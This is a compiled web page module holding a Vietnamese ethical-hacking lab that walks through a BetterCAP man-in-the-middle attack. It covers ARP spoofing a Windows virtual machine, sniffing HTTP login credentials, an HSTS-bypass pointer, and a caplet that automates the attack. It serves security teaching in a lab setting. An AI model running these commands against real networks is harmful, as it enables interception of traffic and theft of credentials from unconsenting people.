import{_ as n,c as e,a1 as a,o as i}from"./chunks/framework.BDxlaA_J.js";const d=JSON.parse('{"title":"Tấn công MITM bằng BetterCAP","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md","filePath":"vi/categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md"}'),c={name:"vi/categories/ethical-hacking-labs/7-sniffing/1-MITM-with-Bettercap.md"};function h(s,t,o,r,p,l){return i(),e("div",null,t[0]||(t[0]=[a(`<h1 id="tan-cong-mitm-bang-bettercap" tabindex="-1">Tấn công MITM bằng BetterCAP <a class="header-anchor" href="#tan-cong-mitm-bang-bettercap" aria-label="Permalink to &quot;Tấn công MITM bằng BetterCAP&quot;">​</a></h1><p align="center"><img width="30%" src="https://raw.githubusercontent.com/bettercap/media/master/logo.png"></p> BetterCAP là một framework mạnh mẽ, dễ mở rộng và di động được viết bằng Go nhằm cung cấp cho nhà nghiên cứu bảo mật, red teamer và nhà ngược kỹ thuật một giải pháp tất cả trong một dễ sử dụng với tất cả các tính năng họ có thể cần để thực hiện trinh sát và tấn công mạng WiFi, thiết bị Bluetooth Low Energy, thiết bị HID không dây và mạng Ethernet. <p>_Tài liệu chính thức Bettercap: <a href="https://www.bettercap.org/intro/_" target="_blank" rel="noreferrer">https://www.bettercap.org/intro/_</a></p><p>_Kho lưu trữ chính thức: <a href="https://github.com/bettercap/bettercap_" target="_blank" rel="noreferrer">https://github.com/bettercap/bettercap_</a></p><h3 id="tan-cong-mitm-man-in-the-middle-attack" tabindex="-1">Tấn công MITM <em>(Man-in-the-Middle Attack)</em> <a class="header-anchor" href="#tan-cong-mitm-man-in-the-middle-attack" aria-label="Permalink to &quot;Tấn công MITM _(Man-in-the-Middle Attack)_&quot;">​</a></h3><p>MITM là một hình thức nghe trộm chủ động trong đó kẻ tấn công tạo kết nối độc lập với nạn nhân và chuyển tiếp tin nhắn giữa họ, khiến họ tin rằng họ đang nói chuyện trực tiếp với nhau qua kết nối riêng tư, trong khi thực tế toàn bộ cuộc trò chuyện được kiểm soát bởi kẻ tấn công.</p><p>Tấn công MITM có nhiều biến thể.</p><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Sniff lưu lượng mạng và thực hiện ARP poisoning.</li><li>Khởi chạy tấn công Man-in-the-Middle.</li><li>Sniff lưu lượng mạng để tìm mật khẩu.</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Kali Linux.</li><li>Bất kỳ máy ảo Windows nào (7, 8, 10 hoặc Server).</li></ul><hr><h2 id="cai-đat-bettercap" tabindex="-1">Cài đặt BetterCAP <a class="header-anchor" href="#cai-đat-bettercap" aria-label="Permalink to &quot;Cài đặt BetterCAP&quot;">​</a></h2><p>Khởi chạy Kali Linux, mở cửa sổ Terminal mới và nhập các lệnh sau:</p><p><code>apt-get update</code><code>apt-get install bettercap</code></p><h2 id="cac-module-bettercap" tabindex="-1">Các module BetterCAP <a class="header-anchor" href="#cac-module-bettercap" aria-label="Permalink to &quot;Các module BetterCAP&quot;">​</a></h2><p>Để khởi chạy chương trình, nhập <code>bettercap</code> và chỉ định giao diện mạng hiện tại của bạn:</p><p><code>bettercap -iface eth0</code></p><p>Nhập <strong>help</strong> để liệt kê tất cả các module có sẵn:</p><p><code>help</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/7e4aa214016257e51ca5c19231801f0554de6134/bettercap-1.png" alt="modules"></p><p>Module <strong>events.stream</strong> đang <strong>chạy</strong> theo mặc định, module này được bật theo mặc định và chịu trách nhiệm báo cáo các sự kiện (log, máy chủ mới được tìm thấy, v.v.) được tạo bởi các module khác trong phiên tương tác. Hơn nữa, nó có thể được sử dụng để thực thi lệnh theo chương trình khi các sự kiện cụ thể xảy ra.</p><p><strong>Để thực hiện tấn công MITM chúng ta sẽ sử dụng các module dưới đây:</strong></p><table tabindex="0"><thead><tr><th>module</th><th>Mô tả</th></tr></thead><tbody><tr><td><code>net.probe</code></td><td>Khi được kích hoạt, module này sẽ gửi các loại gói thăm dò khác nhau đến mỗi IP trong subnet hiện tại để module net.recon phát hiện chúng. <a href="https://www.bettercap.org/modules/ethernet/net.probe/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>net.recon</code></td><td>Module này chịu trách nhiệm đọc bảng ARP hệ thống định kỳ để phát hiện máy chủ mới trên mạng. <a href="https://www.bettercap.org/modules/ethernet/net.recon/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>arp.spoof</code></td><td>Module này liên tục giả mạo các máy chủ được chọn trên mạng bằng các gói ARP được tạo để thực hiện tấn công MITM. <a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" target="_blank" rel="noreferrer">[+]</a></td></tr><tr><td><code>net.sniff</code></td><td>Module này là packet sniffer và fuzzer mạng hỗ trợ cả cú pháp BPF và biểu thức chính quy để lọc. Nó cũng có thể phân tích nhiều giao thức chính để thu thập thông tin đăng nhập. <a href="https://www.bettercap.org/modules/ethernet/net.sniff/" target="_blank" rel="noreferrer">[+]</a></td></tr></tbody></table><p><em>Bạn có thể nhập <code>help</code> theo sau là tên <code>module</code> để lấy thông tin chi tiết:</em><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/c2be3479c96a94b3d2c042e8c8c4df20a4a06b57/bettercap-2.png" alt="b2"></p><h2 id="thiet-lap-cac-module-đe-thuc-hien-arp-spoofing" tabindex="-1">Thiết lập các module để thực hiện ARP spoofing <a class="header-anchor" href="#thiet-lap-cac-module-đe-thuc-hien-arp-spoofing" aria-label="Permalink to &quot;Thiết lập các module để thực hiện ARP spoofing&quot;">​</a></h2><ol><li>Khởi chạy module <strong>prober</strong> để gửi các loại gói thăm dò khác nhau đến mỗi IP trong subnet hiện tại để module <strong>net.recon</strong> phát hiện chúng. <em>(Lưu ý: module prober có thể tự động khởi chạy module net.recon).</em><code>net.probe on</code></li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » net.probe on</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:32] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:32] [endpoint.new] endpoint 10.0.2.3 detected as 07:00:27:11:6c:7d .</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [11:43:33] [endpoint.new] endpoint 10.0.2.43 detected as 07:00:27:81:d6:f2 .</span></span></code></pre></div><p>Trong lab của tôi, <strong>10.0.2.43</strong> là máy ảo Windows, điều này có thể khác với môi trường ảo của bạn.</p><ol start="2"><li>Bắt đầu khám phá máy chủ mạng: <code>net.recon on</code></li></ol><ul><li>Lưu ý: bạn có thể nhập <code>net.show</code> để xem tất cả các client đang kết nối hiển thị địa chỉ IP và địa chỉ MAC.</li></ul><ol start="3"><li><p>Đặt tùy chọn <strong>fullduplex</strong> của module <strong>arp.spoof</strong> thành <strong>true</strong>. Khi bạn đặt thành true, cả mục tiêu và gateway đều sẽ bị tấn công, nếu không chỉ có mục tiêu (nếu router có cơ chế bảo vệ ARP spoofing điều này sẽ khiến cuộc tấn công thất bại). <code>set arp.spoof.fullduplex true</code></p></li><li><p>Chỉ định mục tiêu để spoof. <em>(Danh sách phân tách bằng dấu phẩy của địa chỉ MAC, địa chỉ IP, phạm vi IP hoặc bí danh để spoof).</em><code>set arp.spoof.targets 10.0.2.43</code></p></li><li><p>Khởi chạy ARP spoofer: <code>arp.spoof on</code></p></li></ol><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof enabling forwarding</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.</span></span>
<span class="line"><span>10.0.2.0/24 &gt; 10.0.2.42  » [12:03:58] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.</span></span></code></pre></div><ol start="6"><li><p>Khởi chạy packet sniffer: <code>net.sniff on</code></p></li><li><p>Nhập <code>help</code> để liệt kê các module đang chạy: <img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9b7efcd559aef438cbbf1aa8a14ceeced52b19d5/bettercap-3.png" alt="modules2"></p></li></ol><h3 id="arp-spoofing" tabindex="-1">ARP spoofing <a class="header-anchor" href="#arp-spoofing" aria-label="Permalink to &quot;ARP spoofing&quot;">​</a></h3><p>Bettercap đang đánh lừa <strong>router</strong> và <strong>máy mục tiêu (Windows)</strong>, đặt <strong>máy tấn công (Kali)</strong> vào giữa kết nối.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/913307b303fe83f04dd10b2c9760fe370e95a1e6/arp-4.png" alt="arp"></p><p><strong>Trên máy Windows</strong> của tôi, tôi sẽ sử dụng <strong>lệnh bảng arp</strong> để xem những gì đang xảy ra:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/af2872eca1b4d3ecf5c2b3979d8ffd33d1652186/arp-5.png" alt="arp5"></p><p>Như bạn có thể thấy, máy Windows &#39;nghĩ&#39; rằng địa chỉ MAC của <strong>router</strong> giống với <strong>Kali</strong> vì bảng ARP đã bị giả mạo.</p><h3 id="tao-mot-so-luu-luong-chung-tren-may-muc-tieu" tabindex="-1">Tạo một số lưu lượng chung trên máy mục tiêu. <a class="header-anchor" href="#tao-mot-so-luu-luong-chung-tren-may-muc-tieu" aria-label="Permalink to &quot;Tạo một số lưu lượng chung trên máy mục tiêu.&quot;">​</a></h3><ol><li>Đăng nhập vào máy ảo Windows của bạn.</li><li>Khởi chạy trình duyệt và nhập URL: <a href="http://testhtml5.vulnweb.com" target="_blank" rel="noreferrer">http://testhtml5.vulnweb.com</a></li><li>Đăng nhập vào trang web kiểm thử lỗ hổng này với thông tin đăng nhập mẫu: <strong>user: admin | password: password</strong>.</li></ol><h3 id="bat-va-phan-tich-moi-request" tabindex="-1">Bắt và phân tích mọi request <a class="header-anchor" href="#bat-va-phan-tich-moi-request" aria-label="Permalink to &quot;Bắt và phân tích mọi request&quot;">​</a></h3><ul><li>Quay lại Bettercap trên máy Kali và phân tích tất cả các request được gửi từ Windows.</li></ul><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/e27e815cbb390ab5c7d5928fe897f49a71cf73ce/bettercap-7.png" alt="b7"></p><p>Như bạn có thể thấy, chúng tôi đã bắt được thông tin đăng nhập được gửi đến trang web. Bất cứ thứ gì máy mục tiêu gửi và nhận đều sẽ được bắt bởi máy Kali Linux.</p><p><em><strong>Lưu ý</strong>: kỹ thuật này hoạt động trên trang web HTTP không phải HTTPS. Để thực hiện hành động này bạn cần bypass HSTS (HTTP Strict Transport Security). Bạn có thể thực hiện kỹ thuật này bằng Bettercap và caplet <a href="https://github.com/bettercap/caplets/tree/master/hstshijack" target="_blank" rel="noreferrer">hstshijack</a>.</em></p><h2 id="tu-đong-hoa-bettercap-bang-caplets" tabindex="-1">Tự động hóa BetterCAP bằng Caplets <a class="header-anchor" href="#tu-đong-hoa-bettercap-bang-caplets" aria-label="Permalink to &quot;Tự động hóa BetterCAP bằng Caplets&quot;">​</a></h2><p>Để hiệu quả hơn trong công việc, bạn có thể tự động hóa phần thiết lập module bằng cách tạo một <strong>tệp Caplet</strong> đơn giản (file.cap) và thêm các lệnh trên mỗi dòng.</p><ol><li><p>Tạo caplet: <code>touch spoof.cap</code></p></li><li><p>Thêm các lệnh và lưu: <code>nano spoof.cap</code></p></li></ol><div class="language-sh vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sh</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.probe</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.fullduplex</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> arp.spoof.targets</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10.0.2.5</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">arp.spoof</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> net.sniff.local</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">net.sniff</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> on</span></span></code></pre></div><p>Như bạn có thể thấy đây là các lệnh tương tự theo thứ tự bạn đã sử dụng trước đó.</p><ol start="3"><li>Khởi chạy <strong>Bettercap</strong> bằng <strong>Caplet</strong> spoof mà bạn đã tạo: <code>bettercap -iface eth0 -caplet spoof.cap</code></li></ol>`,54)]))}const u=n(c,[["render",h]]);export{d as __pageData,u as default};
